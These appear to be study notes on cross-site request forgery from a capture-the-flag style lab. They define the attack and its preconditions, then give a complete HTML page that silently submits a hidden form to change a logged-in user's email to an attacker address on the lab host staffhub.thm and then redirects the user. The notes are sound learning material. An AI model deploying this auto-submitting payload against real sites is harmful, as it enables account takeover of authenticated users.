#CSRF

an attacker tricks a browser into sending a request to a website where the user is already authenticated, abuses of trust relationship

Conditions : 

1 the victim must be authenticated to the application

2 the application must perform a state changing action

3 the application doesn't verify if the request came from a trusted source

Example of CSRF :

the goal is to change the email of an authenticated user on the test website staffhub.thm

1 create a web page that sends requests to the application's server

cd /var/www/html , nano settings.html

<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
